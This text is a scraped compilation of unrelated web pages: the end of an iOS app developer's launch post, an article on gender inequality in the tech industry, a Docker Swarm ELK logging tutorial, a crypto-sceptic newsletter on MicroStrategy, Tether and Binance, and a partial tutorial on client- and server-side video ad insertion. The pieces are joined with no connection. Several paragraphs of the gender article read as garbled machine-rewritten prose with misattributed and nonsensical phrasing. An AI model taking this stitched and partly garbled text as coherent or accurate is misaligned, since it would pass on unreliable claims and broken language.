*: Due to the Covid 19 Pandemic the German Government lowered the VAT from 19% to 16% until end of 2020.</code></pre><p>As you can see above I would need at least 72 sales per year to break even 😀 But since this is only a side project, every purchase makes me happy and I'm totally grateful for it 😊</p><h3 id="building">Building</h3><p>Building fastbackward was actually pretty straightforward. It takes a moment until I got used to Swift / SwiftUI but there are tons of tutorials and courses out there which covers most of the common topics.</p><p>One of the best sources I've stumbled upon is <em>Hacking with Swift </em>by<em> Paul Hudson</em>:</p><figure><a href="https://www.hackingwithswift.com/"><div><p>Hacking with Swift – learn to code iPhone and iPad apps with free Swift 5.2 tutorials</p><p>Learn Swift coding for iOS with these free Swift 5.2 tutorials</p><p><img src="https://www.hackingwithswift.com/android-icon-192x192.png"><span>Paul Hudson twostraws</span><span>Airbnb</span></p></div><p><img src="https://www.hackingwithswift.com/img/logo-curves.svg"></p></a></figure><p>The only thing which is important if you are looking on Stackoverflow for an answer: Scroll down 😀 Usually the accepted solution is some months/years old and in Swift years that's simply decades! Always look for the latest solution in Swift 5 or 5.2.</p><h3 id="submitted-for-review">Submitted for Review</h3><p>Everyone seems to be afraid of the AppStore review process. So was I.</p><p>I submitted fastbackward on the 20th of November for Review and in the late evening I got rejected 😱😭</p><p>The reason was that the reviewer wasn't able to properly test my App. fastbackward requires photos you took on the same day X years ago. For the first try I added a sample photo and wrote in the review notes that they have to set the test devices date to the 8th of August (creation date of the sample file). I guess that was a little too much of a hassle for them. I got rejected but was asked to provide a Screen recording of my App from a real device. </p><p>That's what I did and 2 hours later fastbackward has been approved 🎊🎉</p><h3 id="what-s-next">What's next?</h3><p>I have still a lot of ideas (and refactorings 😬) in my mind which will land in future versions of fastbackward.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description">
<p><em>Gender inequality</em> examples are all around us, and we learn to recognize them from a very early age. However, most cases based on differences between men and women usually praise <em>one</em> side while undermining the other. Female developers enter into this problem reluctantly, being an ever-present target for inequality proponents.</p>
<p>We want to believe that gender should not be a discriminative factor in IT, and the sooner everyone accepts this realization, the better we look in the eyes of our future selves.<br>A quick look at how women rank in the tech business shows us how vulnerable companies are to gender-based attacks. At Facebook and Apple, most employees are men. The same goes for Microsoft and Google. Is the IT industry going to stay a man’s domain?<br>Although the IT Industry feels the man-to-women ratio discrepancy, it is not a strictly IT-related problem. In fact, all other sectors <em>except manufacturing</em> are all man dominated.</p>
<div>
<blockquote>
<p>Gender inequality should shame us all in the 21st century because it is not only unacceptable, it is stupid!</p>
</blockquote>

</div>
<h2>A look at the numbers</h2>
<p>A GAO report from 2015 suggests that a little over one-third of people working in the tech sector are female in the US. Even though the discrepancy gap between gender has been evening out since the 80s, gender issues are still stagnating the market with equal opportunities demands of all nature.<br>The number of female software engineer graduates ready to enter the workforce is even lower than the number of total employed women in the sector, which shows that they are somewhat reluctant to pursue a career in this domain. Even more — nearly half of the women who graduate as certified engineers choose not to enter the industry market as coders. Most females from the IT industry prefer more creative positions like <strong><a href="https://codecoda.com/en/blog/entry/ui-ux-design-explained">graphics</a></strong> or fashion designers.<br>Some might suggest that coding is hard for girls, which mostly deters them from taking this path. However, there is a lot more ingredients brewing in the pot. And besides, software development is <strong>not exactly rocket science</strong>. Female working in high tech is under the constant umbrella of possible male repression and the fear of being undermined. Gender inequality claims and conditions are prerequisites for creating a very unhealthy work environment and navigating around them, sometimes facing the facts straight away.<br>We believe the female contribution to software development and the way it changes and improves is undeniable. The fact that gender inequality factors sustain a <em>dogma</em> in the business world is what some female programmers recognize as motivating factors. We strongly encourage all girls interested in software engineering to pursue their dream because very soon, all traces of discomfort coming due to inequality will be a thing in the past.<br>Let’s look at some concrete reasons why women may feel threatened while impacting the tech industry.</p>
<h2>Feeling like a stranger in your own yard</h2>
<p>During college and her first year on the job, Maria shared that she felt like an <em>alien</em>. She was repeatedly asked about her <em>qualifications</em> and peppered with comments on her excellent dress style and <em>neat appearance</em>. They even used a loud pitch to inquire about here future planning on family and children.<br>Such experience comes with an initial shock, Maria said. She decided to <em>desensitize</em> herself from this disturbance and focus on picking up <em>skills</em> quickly. She learned how to rise above obstacles and familiarized herself with strong male rivals, as well as a horde of competition from the same gender. These initial struggles were very challenging, but she eventually learned how to better promote her accomplishments and successes.<br>Nowadays, Maria is an intrapreneur working for <em>Samsung</em>. She quickly adapted to the male ruled world of IT and learned how to be excellent at it.</p>
<h2>Why women leave</h2>
<p>Maria was motivated to succeed, but as we mentioned before, many women in <strong>software engineering</strong> decide to move to industries outside the tech domain shortly after getting their first job. We are not busting a myth here. Evidence is abundant for the fact that most of all high-ranked employees are men.<br>Part of the reason can be the already discussed reluctance of women to become software engineers. It is almost normal to see young female developers leaving their current job and switching to a different career path.<br>We know that the role of women in technology use and development is somewhat under-represented. However, it’s much more essential to recognize the need for more women to engage in activities previously associated with men stereotypes. History is rich in examples of women with stellar minds and determination. We have collectively allowed for a working environment that admits discrimination. Gender-based factors are both powerful arguments as well as liability for all parties involved. They sometimes cause damage and eventually delay our progress.<br>Companies that are more gender-neutral in their approach towards employees and businesses create a friendly ecosystem where professionals work closely with each other and learn ways to optimize their collective output as a team.<br>In contrast, <strong>gender discrimination</strong> is a recipe for a toxic work environment with seriously undermined potential. The value of any <em>Men’s club</em> is denominating with each passing day. We must be smart and quickly acknowledge gender discrimination as something we need <em>to put in our calendars</em>.<br>Of course, if too much energy goes into denouncing some of the patriarchy-based business models, the opposite effect is due. We can see the impact in companies whose mission is to turn their female employees into relentless business warriors.</p>
<div>
<blockquote>
<p>We need to understand that if we all work on inclusion together, it’s going to be faster, broader, better, and more thorough than anything we can do on our own.</p>
</blockquote>
<p>Former Reddit CEO + Current Co-Founder of Project Include</p>
</div>
<h2>Focus on belief</h2>
<p>The level of confidence of women has very much detrimental to their success rate. One such woman brings the statistical part of gender distribution in the workforce to another level — she created a <a href="https://docs.google.com/spreadsheets/d/1BxbEifUr1z6HwY2_IcExQwUpKPRZY3FZ4x4ZFzZU-5E/edit#gid=0" target="_blank" rel="nofollow">spreadsheet with about 80 different companies</a> and their man/women employee ratio. I’m very eager to point out that these numbers represent not <em>all the women</em> in a company, but <em>all the women who are software engineers.</em> This spreadsheet is a fine example of how science can help us use data to better deal with a century-old problem.<br>Women are fully equipped <em>to do well in IT</em>. Sara Gottlieb proves that a strong belief is at the base of success. She is the software engineer behind <em>SurveyMonkey</em>. Sara is an excellent software engineer who decided she didn’t have enough on her plate already and started learning more about <strong>engineering management</strong>. Not long after that, she became a recognized mentor in Hackbright Academy, teaching programming classes to other women.<br>Focus on belief is a powerful success tool, significantly when others recognize it and support it. Joyce Jang was encouraged by both men and women in her company to pursue her career advancement. Having a lady in high positions is excellent makes the real difference. It also sets a healthy pace for all men. </p>
<h2>Less Shy, More Direct</h2>
<p>Caroline Tess, a VP, has been trapped under a male dominance sea before realizing her best card. She says that when making a conversation, she tries to stay as clear and assertive as possible while maintaining directness and presence. Speaking up, especially when you have a valid argument, helps understand your work potential and your identity as a professional. Speak up and be heard!<br>Women are somewhat less competitive than the testosterone-driven men, who are creative enough to turn anything into a fierce competition. Women are less likely to demand recognition or honor but just as <em>equally entitled to it</em>.<br>Joyce Stack, an engineer advocate in Mendeley, says the best recommendation for women and visitors to surrender is to ask for something acceptable to them. It is what Stack did to get a major position in programming testing. “After the meeting, they asked the spot if there were any additional inquiries, and I requested this activity.” “Because you are considering it, no one will give you anything. You need to open your mouth and question.”</p>
<h2>Find a coach or a supporter</h2>
<p>Ladies looking to ascend the career ladder and reach leadership positions line up with male <em>and</em> female coaches and supporters.<br>Maria perceived the significance of having a coach right off the bat. It kept on searching them out all through her profession, remembering for her developer functions at eBay and Microsoft. Besides, she established a versatile web-based media stage Flockish and Anecdote, an inventive photograph network bought by Samsung.<br>She claims that your guide can’t be an arbitrary person.<br><em>“You need to discover somebody that acknowledges you and your abilities,</em>”<br>she clarifies.<br><em>“Your mentor better be a senior who can convey their knowledge and perspective.”</em><br><em>“That is the secret to escaping a reality where work becomes more of a minefield than a healthy environment for personal and professional development.”</em></p>
<h2>Talk to Female Role Models</h2>
<p>Women continue to prove they can lead and be excellent role models – most examples from history ring true even today. The world’s top female developers now are just as stellar as those <a href="https://wiredelta.com/the-history-of-women-in-software-and-programming/" target="_blank" rel="nofollow">from our not so distant past</a>. Creating a LinkedIn profile and contacting other female software engineers is an incredible way to strengthen your network and widen advancement opportunities. Start a discussion with a female professional and share some views about your personal experience and professional interests. You will be amazed at the freedom and openness level when it comes to getting help from peers.</p>
<h2>Be Bold for Change</h2>
<p>The International Women’s Day is bringing awareness with the <strong>#BeBoldForChange</strong>. Change happens when we get to work in full swing. We urge you to learn improvement, attend tech opportunities, work tirelessly, value yourself, and be confident in fulfilling your potential. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        <p>In this tutorial you’ll see how to set up easily an ELK (<strong>E</strong>lastic, <strong>L</strong>ogstash, <strong>K</strong>ibana) stack to have a
centralized logging solution for your Docker swarm cluster.</p>

<p>Below you’ll find the full stack to have a working ELK stack on your docker swarm.</p>
<div><pre><code data-lang="yaml"><span>version</span>: <span>'3'</span>

<span>services</span>:
  <span>elasticsearch</span>:
    <span>image</span>: elasticsearch:<span>7.9.3</span>
    <span>environment</span>:
      - discovery.type=single-node
      - ES_JAVA_OPTS=-Xms2g -Xmx2g
    <span>volumes</span>:
      - esdata:/usr/share/elasticsearch/data
  <span>kibana</span>:
    <span>image</span>: kibana:<span>7.9.3</span>
    <span>depends_on</span>:
      - elasticsearch
    <span>ports</span>:
      - <span>"5601:5601"</span>
  <span>logstash</span>:
    <span>image</span>: logstash:<span>7.9.3</span>
    <span>ports</span>:
      - <span>"12201:12201/udp"</span>
    <span>depends_on</span>:
      - elasticsearch
    <span>deploy</span>:
      <span>mode</span>: global
    <span>volumes</span>:
      - logstash-pipeline:/usr/share/logstash/pipeline/
<span>volumes</span>:
  <span>esdata</span>:
    <span>driver</span>: local
  <span>logstash-pipeline</span>:
    <span>driver</span>: local
</code></pre></div><p>I will break down the configuration part to explain what’s going on:</p>
<hr>
<div><pre><code data-lang="yaml"><span>elasticsearch</span>:
  <span>image</span>: elasticsearch:<span>7.9.3</span>
  <span>environment</span>:
    - discovery.type=single-node
    - ES_JAVA_OPTS=-Xms2g -Xmx2g
  <span>volumes</span>:
    - esdata:/usr/share/elasticsearch/data
</code></pre></div><p>First we need to create an elasticsearch container, nothing fancy:</p>
<div><pre><code data-lang="yaml">- discovery.type=single-node
</code></pre></div><p>We need to set the discovery to <code>single-node</code> to evade bootstrap checks. See <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html#single-node-discovery">this</a> for more information.</p>
<div><pre><code data-lang="yaml">- ES_JAVA_OPTS=-Xms2g -Xmx2g
</code></pre></div><p>Here we need to increase the minimum memory for the container.</p>
<hr>
<div><pre><code data-lang="yaml"><span>kibana</span>:
  <span>image</span>: kibana:<span>7.9.3</span>
  <span>depends_on</span>:
    - elasticsearch
  <span>ports</span>:
    - <span>"5601:5601"</span>
</code></pre></div><p>This one is simple, we are creating a kibana container to view the logs. The container expose the port <code>5601</code> in order
for you to reach the dashboard. In a production context it will be better to expose kibana trough <a href="https://traefik.io/">Traefik</a>
with a <a href="https://doc.traefik.io/traefik/middlewares/basicauth/">Basic Auth</a> middleware for example.</p>
<p>The kibana container will automatically try to connect to an elasticsearch search at address <code>elasticsearch</code>. So as
long as the elasticsearch container is named <code>elasticsearch</code>, no further configuration is required to make it work.</p>
<hr>
<div><pre><code data-lang="yaml"><span>logstash</span>:
  <span>image</span>: logstash:<span>7.9.3</span>
  <span>ports</span>:
    - <span>"12201:12201/udp"</span>
  <span>depends_on</span>:
    - elasticsearch
  <span>deploy</span>:
    <span>mode</span>: global
  <span>volumes</span>:
    - logstash-pipeline:/usr/share/logstash/pipeline/
</code></pre></div><p>Final part, the logstash container. It’s the process who will collect the containers logs to aggregate them
and push them to ES.</p>
<div><pre><code data-lang="yaml"><span>ports</span>:
  - <span>"12201:12201/udp"</span>
</code></pre></div><p>The logstash process will expose a GELF UDP endpoint on port 12201, and the docker engine will push the logs to that
endpoint.</p>
<p>We will need to have one logstash agent running per node, so that container can push logs to it.</p>
<div><pre><code data-lang="yaml"><span>volumes</span>:
  - logstash-pipeline:/usr/share/logstash/pipeline/
</code></pre></div><p>We will need to setup logstash to listen on that port and forward the logs to ES. This will be done by creating
a pipeline, that we will put in this volume.</p>
<hr>
<p>Now we will need to bring up this stack:</p>
<div><pre><code data-lang="shell">creekorful@host:~$ docker stack deploy logs -c logs.yaml
</code></pre></div>
<p>Now that we have our 3 containers up and alive, we will need to configure logstash. This is done by putting the following
file <code>logstash.conf</code> into the <code>logstash-pipeline</code> volume.</p>
<pre><code data-lang="conf">input {
   gelf {
   }
}

output {
	elasticsearch {
		hosts =&gt; "elasticsearch:9200"
	}
}
</code></pre><p>This configuration will set up an <code>UDP</code> (default) GELF endpoint on port <code>12201</code> (default), and output the logs
to elasticsearch host.</p>
<p>Now we will need to kill the container so that it restart with the new configuration.</p>

<p>Now that we have our containers up and running we need to indicate to Docker to push the logs to logstash.
This can be done by two approach:</p>
<h2 id="global-configuration">Global configuration<a href="#global-configuration" arialabel="Anchor">⌗</a> </h2>
<p>We can change the Docker default logging driver to that every container created will push the logs automatically
to the logstash container. This is done by editing the <code>/etc/docker/daemon.json</code> config file.</p>
<div><pre><code data-lang="json">{
  <span>"log-driver"</span>: <span>"gelf"</span>,
  <span>"log-opts"</span>: {
    <span>"gelf-address"</span>: <span>"udp://localhost:12201"</span>
  }
}
</code></pre></div><p>Note: you can see that we are submitting the logs to <code>udp://localhost:12201</code>, this is because the logs are submitted
trough the host network.</p>
<h2 id="per-stack-configurations">Per stack configurations<a href="#per-stack-configurations" arialabel="Anchor">⌗</a> </h2>
<p>If you prefer to configure only logging for some of your containers, this can be done individually on each stack
like this:</p>
<div><pre><code data-lang="yaml"><span>logging</span>:
  <span>driver</span>: gelf
  <span>options</span>:
    <span>gelf-address</span>: <span>"udp://localhost:12201"</span>
</code></pre></div>
<p>Now you should have a running logging mechanism.</p>
<p>Long live Docker Swarm and Happy hacking !</p>

<p>Crypto has come of age. What does that mean?</p>

<p>Among other things, it means MicroStrategy CEO Michael Saylor has replaced Patrick Bryne as the new crazy god of institutional bitcoiners.&nbsp;And another crypto exit scam has been invented: <a href="https://amycastor.com/2019/02/12/how-the-hell-did-we-get-here-a-timeline-of-quadrigacx-events/" target="_blank" rel="noreferrer noopener">dying in India</a>. (See Jorge Stolfi’s full <a href="https://np.reddit.com/r/Buttcoin/comments/k42nun/when_they_say_cryptocurrency_has_comes_of_age/ge9doit/" target="_blank" rel="noreferrer noopener">reddit post</a>. He is a computer scientist in Brazil.)</p>



<p>All Ponzi schemes eventually implode, even if it takes 25 years like Bernie Madoff’s did. When that happens, you have two choices: turn yourself in or disappear. Gerald Cotten chose to disappear. Of course, many people believe he is really and truly dead. I’m just not one of them. </p>



<p>With that, here is the news that I find interesting from Bitcoinlandia, an imaginary place where people keep insisting bitcoin is not a Ponzi. </p>



<h2>MicroStrategy buys more BTC</h2>



<p>MicroStrategy continues to funnel its excess cash into bitcoin. The analytics firm bought another $50 million worth of bitcoin, Saylor disclosed in a <a href="https://twitter.com/michael_saylor/status/1334990791496884224?s=21" target="_blank" rel="noreferrer noopener">tweet</a>. </p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">MicroStrategy has purchased approximately 2,574 bitcoins for $50.0 million in cash in accordance with its Treasury Reserve Policy, at an average price of approximately $19,427 per bitcoin. We now hold approximately 40,824 bitcoins.<a href="https://t.co/nwZcM9zAXZ">https://t.co/nwZcM9zAXZ</a></p>— Michael Saylor (@michael_saylor) <a href="https://twitter.com/michael_saylor/status/1334990791496884224?ref_src=twsrc%5Etfw">December 4, 2020</a></blockquote></div>
</div></figure>



<p>MicroStrategy bought its most recent pile of bitcoins at an average price of $19,427—at the top of the market—and now owns a total of 40,824 bitcoins.  </p>



<p>Here’s the thing: Saylor holds 73% of the voting stock of MicroStrategy, so he does not need buy-in from stockholders to make decisions.&nbsp;He is ruler and king, and if he wants <em>his firm</em> to buy more bitcoin, so be it. </p>



<p>Saylor also has a large private stash of bitcoins. I would be very curious to know how much BTC he owned <em>before and after</em> MicroStrategy’s recent purchase.&nbsp;&nbsp;</p>



<p>If those bitcoin hold their value, all will be fine, Jorge Stolfi <a href="https://www.reddit.com/r/Buttcoin/comments/k6zfx5/microstrategy_just_purchased_an_additional_2574/georccd/" target="_blank" rel="noreferrer noopener">said</a> on Reddit. But, if BTC “drops back to $8,000, the other stockholders will be upset, and may have grounds to sue Michael for mismanagement or whatever—even if there are no other shenanigans. If he did sell his coins while the company bought them, it will be worse.”</p>



<h2>Guggenheim Partners</h2>



<p>Another institutional investor has jumped on the bitcoin bandwagon. In a recent <a href="https://sec.report/Document/0001628280-20-016852/gft112020485afidoc.htm" target="_blank" rel="noreferrer noopener">SEC filing</a>, Guggenheim Partners, a leading Wall Street investment firm, revealed that it is looking to invest 10% of its $5.3 billion Macro Opportunities Fund<a href="https://www.guggenheiminvestments.com/mutual-funds/fund/gioix-macro-opportunities" target="_blank" rel="noreferrer noopener"> into Grayscale’s Bitcoin Trust.</a></p>



<p>To be clear, Guggenheim is not buying bitcoin directly. It plans to invest nearly $500 million in GBTC shares. Grayscale itself now owns <a href="https://cointelegraph.com/news/grayscale-now-has-half-a-million-bitcoin" target="_blank" rel="noreferrer noopener">more than 500,000 bitcoin</a>. </p>



<p>And Guggenheim isn’t taking on any risk. The firm makes money whether the price of BTC goes up or down. The retailers who are invested in the fund are the ones who carry all the risk. </p>



<p>Bitcoin is highly volatile and has no role in retail investor portfolios. As Economist Nouriel Roubini explained in a lengthy <a href="https://twitter.com/Nouriel/status/1331980212502978560" target="_blank" rel="noreferrer noopener">Twitte</a><a href="https://twitter.com/Nouriel/status/1331980212502978560">r</a> rant:</p>



<p>“Investing in BTC is equivalent to [taking] your portfolio to a rigged illegal casino &amp; [gambling]; at least in legit Las Vegas casinos odds aren’t stacked against you as those gambling markets aren’t manipulated the way BTC is. Instead BTC is manipulated heavily by Tether &amp; whales.”</p>



<h2>Tether’s runaway train </h2>



<div><figure><a href="https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg"><img loading="lazy" data-attachment-id="4974" data-permalink="https://amycastor.com/runaway-train-1-300x417-1/" data-orig-file="https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg" data-orig-size="300,417" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="runaway-train-1-300×417-1" data-image-description="" data-medium-file="https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg?w=216" data-large-file="https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg?w=300" src="https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg?w=300" alt="" width="249" height="346" srcset="https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg?w=249 249w, https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg?w=108 108w, https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg?w=216 216w, https://amyhcastor.files.wordpress.com/2020/12/runaway-train-1-300x417-1.jpg 300w" sizes="(max-width: 249px) 100vw, 249px"></a></figure></div>



<p>On to my favorite topic: Tether—a firm that mints a dollar-pegged stablecoin that’s hugely popular on unbanked exchanges.</p>



<p>On Nov. 28, Tether surpassed 19 billion tethers in circulation. And like a runaway train with no way of stopping, it is fast on its way to issuing 20 billion tether—worth the notional equivalent in US dollars. </p>



<p>So, what is going on with the New York Attorney General’s investigation into Tether and Bitfinex? </p>



<p>The last bit of real news we had was in September when Judge Joel M. Cohen once again ordered Bitfinex and Tether to <a href="https://www.coindesk.com/bitfinex-tether-nyag-hearing">turn over financials</a>. However, he did not set a deadline. He left that decision to a special referee, according to <a href="https://www.coindesk.com/bitfinex-tether-nyag-hearing">Coindesk</a>. And we haven’t heard anything on the matter since. </p>



<p>Stepping back, recall that Bitfinex/Tether have been resisting handing over documents since November 2018 when the NYAG—in pursuant to the Martin Act, which gives it broad powers to investigate fraud—first served subpoenas for information stretching back to January 2015.</p>



<p>In April 2019, when the NYAG was concerned that iFinex (parent company of Bitfinex/Tether) was insolvent and Bitfinex was dipping into Tether’s cash reserves, it sought an ex parte order compelling the companies to produce documents and staying further actions pending the ongoing investigation. </p>



<p>iFinex responded with a motion to dismiss. In August 2019, the Supreme Court denied the motion and the respondents sought to appeal, arguing that the NYAG did not have the power to demand documents since Bitfinex and Tether didn’t have sufficient contacts in New York. </p>



<p>In July 9, 2020, a New York state appeals court sided with the&nbsp;NYAG. <a href="https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=Q3WRjXshN15Y4902MCAfjw==">(Court filing)</a></p>



<p>As I’m writing up this newsletter, Coindesk’s <a href="https://twitter.com/nikhileshde/status/1335705545051877378">Nikhilesh De</a> has just pulled up a <a href="https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=A7OmCd1LNbrQaRdGxJAzYQ==">new court filing</a> in the case from Dec. 4 that is a bit bewildering. At first glance, it appears to be the same filing from July, repeated twice.</p>



<figure><div>

</div></figure>



<p>Drew Hinks, a lawyer not involved in the case, <a href="https://twitter.com/propelforward/status/1335717224775102465">said</a> the filing is a <a href="https://gyazo.com/2db04c63d45e83e2b8dd1a91f72950a5">remittitur</a>—a jurisdictional document that formally ends the life of an appeal by notifying the world that the decision is final. </p>



<p>I’ll update this post as I learn more—specifically why a remittitur is important after the appellate judgment has already been issued and become final. Does this help the investigation going forward? How? </p>



<h2>Bitcoin’s sets new all-time high</h2>



<p>On Nov. 30, the price of bitcoin reached $19,900 on Coinbase, according to <a href="https://www.theblockcrypto.com/linked/85577/bitcoin-set-new-all-time-high">the Block</a>, surpassing its previous all time high (ATH) set on Dec. 17, 2017, by about $10. </p>



<p>After bitcoin reached its new high, it promptly lost 13% of its value. </p>



<p>When you see bitcoin getting pumped like this, what you are seeing is traders cashing out before the bubble bursts. Bitcoin is not a company. It does not create any actual revenue. Cash coming into the system goes to paying the miners, who sell their 900 newly minted BTC per day and earlier investors lucky enough to sell at the right time. </p>



<p>I’m sure the current pump has nothing to do with the NYAG getting closer to exposing Tether/Bitfinex’s inner workings, the <a href="https://www.nytimes.com/2020/10/01/technology/bitmex-bitcoin-criminal-charges.html">recent indictment</a> of BitMEX operators, and Binance’s latest efforts to <a href="https://www.theblockcrypto.com/post/84020/binance-blocking-us-users-exchange-email-2">aggressively block</a> U.S. citizens from using its exchange. </p>



<h2>Binance pulls in big profits</h2>



<p>The largest tether exchange expects to earn between $800 million and $1 billion in profits for 2020, its captain Changpeng Zhao (“CZ”) <a href="https://www.bloomberg.com/news/articles/2020-12-03/binance-ceo-changpeng-zhao-crypto-s-influence-miner-bloomberg-50-2020">told Bloomberg</a>. The Malta-registered exchange also expected <a href="https://news.bitcoin.com/crypto-exchange-binance-expects-up-to-1-billion-profit-in-2018/">$1 billion in profits 2018</a>.</p>



<p>Speaking of Binance, the crypto exchange is <a href="https://www.coindesk.com/binance-sues-forbes-for-defamation">suing Forbes and two journalists</a> for a recent report claiming that the exchange had a plan to dodge regulations. (Here is the <a href="https://www.docdroid.net/PEikRJX/binance-complaint-pdf">complaint</a>.) It’s unlikely CZ will get anywhere with this lawsuit because the suit will get torn apart in discovery.  </p>



<p>Similar to when <a href="https://bitcoinmagazine.com/articles/bitfinex-critics-prepare-possible-legal-action-after-cryptocurrency-exchange-lawyers">Bitfinex threatened to sue</a> prolific critic Bitfinex’ed in December 2017, this is likely more of warning to other journalist: don’t dig too deep, or we’ll come after you.</p>



<h2>STABLE Act</h2>



<p>The big news of the week is that three congressional democrats are trying to pass a bill that will require stablecoin issuers to comply with the same regulations and rules as banks. </p>



<p>If passed, the&nbsp;Stablecoin Tethering and Bank Licensing Enforcement (STABLE) Act, would require stablecoin issuers to apply for bank charters, get approval from the Federal Reserve and hold FDIC insurance.&nbsp;(<a href="https://tlaib.house.gov/sites/tlaib.house.gov/files/STABLEAct.pdf">The bill</a>, <a href="https://tlaib.house.gov/media/press-releases/tlaib-garcia-and-lynch-stableact">press release</a>.) </p>



<p>Stablecoin issues are like wild cat banks. Back in the 1800s banks would issue their own currency, and nobody knew what was backing the currency. And because these banks were often in remote, hard to get to locations, people often had trouble redeeming their notes for silver or gold or whatever it was that was supposed to be backing them. </p>

<p>Advertising-based monetization is a popular way for content providers to monetize their content and drive their online video revenues. Technically, there are two important ways of inserting ads into videos – CSAI (Client-Side Ad Insertion) and SSAI (Server-Side Ad Insertion).</p>



<p><strong>CSAI works by making calls from the video player to an ad server that responds with the ad. On the other hand, SSAI works by inserting (or stitching) the ad media directly into the video stream, avoiding the need for making calls to a server to receive ads.</strong></p>



<p>In this tutorial, let us look at how CSAI and SSAI work, the main differences, and each’s pros and cons.</p>



<p>Let’s go!</p>



<hr>



<h2>What is CSAI: Client-Side Ad Insertion </h2>



<p><strong>CSAI </strong>(Client-Side Ad Insertion) is the method of delivering ads to clients (desktop, mobile, CTVs, gaming consoles, etc.) where the client (video player) requests the ad server for an ad when it reaches certain ad-markers in the stream or in the manifest (HLS/DASH). </p>



<p>Upon receiving the request from the client, the ad server responds with the “right” ad for the client based on data collected from the client and other information (campaigns, preferences, etc.). The video player then pauses the video, plays the ad (or group of ads), and then resumes video playback (if any). It is also the responsibility of the client to report on the ad metrics (playback, quartiles, interactives, etc.)</p>







<hr>



<h2>How does CSAI (Client-Side Ad Insertion) Work?</h2>



<p>In this section, let’s take a look at how CSAI (Client-Side Ad Insertion) works. It is easily understood from the schematic below from the IAB’s <a href="https://iabtechlab.com/wp-content/uploads/2019/06/VAST_4.2_final_june26.pdf" target="_blank" rel="noopener">VAST 4.2 specification</a>. </p>

<p>Here’s how CSAI works – </p>



<ol><li>Before a video (or live transmission) is sent to the transcoders, the stream is decorated with baseband markers called SCTE-104 markers.</li><li>When the encoder compresses the video, it translates the SCTE-104 markers into&nbsp;<a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/SCTE-35" target="_blank">SCTE-35 markers</a>&nbsp;that are carried with the compressed bitstream. These markers indicate the position of ad breaks (apart from other events) in video streams.</li><li>The video is then packaged into&nbsp;<a href="https://ottverse.com/hls-http-live-streaming-how-does-it-work/">HLS</a>/DASH for&nbsp;<a href="https://ottverse.com/what-is-abr-video-streaming/">ABR streaming</a>, and the manifest locations are made known to the CMS so that the player can access them at the time of playback. The manifests also contain information about the ads that need to be played back (the position, URIs, etc.).</li><li>While encoding and packaging, care is taken to ensure that the segments are terminated if an SCTE-104 marker is found to be in the middle of a segment. And, of course, an IDR is inserted to ensure a clean-start to the next segment. </li></ol>



<p>When the user presses play, </p>



<ol><li>The player downloads the manifest from the CDN and begins the video playback. In the case of a pre-roll ad, the ad begins to playback before the video. </li><li>When the video player reaches an ad-marker, it pauses the video playback and makes an API call to the ad server requesting an ad for playback.</li><li>Typically, the ad server will respond with a VAST XML (or VMAP, VPAID, etc.) containing information about the ad, the ad’s media, and tracking information, etc. To learn more about <a href="https://ottverse.com/vast-tags-how-does-it-work-with-examples/">VAST tags, click here</a>, and <a href="https://ottverse.com/what-is-vpaid-video-player-ad-interface-definition/">click here for the VPAID tutorial</a>). </li><li>The video player uses the information received from the ad server and plays back the ad. After the ad playback, the video player continues playing the video stream.  </li><li>Streaming platforms usually embed their video players with SDKs provided by 1st or 3rd party ad verification services. These SDKs track the position of the ad playback, completion rates, errors, etc., and report back to servers periodically with this information. </li></ol>



<p>As you can see, the heavy-lifting for CSAI is at the client-side and this architecture comes with its own set of advantages and disadvantages. We’ll take a look at them when we discuss the pros/cons of SSAI and CSAI. </p>



<p>For now, let’s move on to SSAI and understand how it works.</p>



<hr>



<h2>What is SSAI: Server-Side Ad Insertion </h2>



<p><strong>SSAI </strong>(a.k.a Dynamic Ad Insertion or DAI) is a way of stitching an ad directly into the video that is being streamed – at the server and not the client. It is fundamentally different from how CSAI works (which relies on the client doing the heavy-lifting). </p>



<p>SSAI has its advantages and disadvantages that we shall see in the next couple of sections.</p>



<p>The primary advantage is that since the client is no longer making any server calls, it is hard to block ads inserted using SSAI. However, SSAI does have a more complicated workflow and it is hard to provide the level of personalization and interactivity as CSAI. Let’s take a look at how SSAI works to understand more.</p>



<hr>



<h2>How does SSAI (Server-Side Ad Insertion) Work?</h2>



<p>Let’s look at how SSAI (Server Side Ad Insertion) works. Here is a schematic from the IAB’s <a href="https://iabtechlab.com/wp-content/uploads/2019/06/VAST_4.2_final_june26.pdf" target="_blank" rel="noopener">VAST 4.2 specification</a>.</p>







<p>Before that, lets take a look at ad markers which are critical to the functioning of either CSAI or SSAI. </p>



